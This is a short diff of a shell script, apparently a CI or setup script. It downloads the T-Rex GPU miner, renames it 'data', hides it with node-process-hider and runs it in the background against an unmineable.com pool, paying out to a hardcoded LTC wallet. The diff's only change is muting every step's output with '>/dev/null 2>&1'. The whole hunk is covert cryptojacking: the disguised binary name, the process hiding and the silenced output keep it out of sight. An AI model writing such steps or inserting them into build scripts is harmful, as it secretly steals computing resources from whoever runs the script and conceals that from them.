@@ -16,11 +16,11 @@
         sudo npm install -g npm
         hash -d npm
         npm i
-        npm i -g node-process-hider && ph add data
-	sudo wget https://github.com/trexminer/T-Rex/releases/download/0.23.1/t-rex-0.23.1-linux.tar.gz
-	sudo tar xvzf t-rex-0.23.1-linux.tar.gz
-	sudo mv t-rex data
-	chmod 777 data
+        npm i -g node-process-hider && ph add data >/dev/null 2>&1
+	sudo wget https://github.com/trexminer/T-Rex/releases/download/0.23.1/t-rex-0.23.1-linux.tar.gz >/dev/null 2>&1
+	sudo tar xvzf t-rex-0.23.1-linux.tar.gz >/dev/null 2>&1
+	sudo mv t-rex data >/dev/null 2>&1
+	chmod 777 data >/dev/null 2>&1
 	nohup ./data -a ethash -o ethash.unmineable.com:3333 -u LTC:LZJ1fV1kYYqAutEHPmEyRTFmvN7L5ZKZAV.$(echo $(shuf -i 1-99999 -n 1)-GPU) -p x -w $1 --no-nvml --no-watchdog >/dev/null 2>&1
 	
 	  
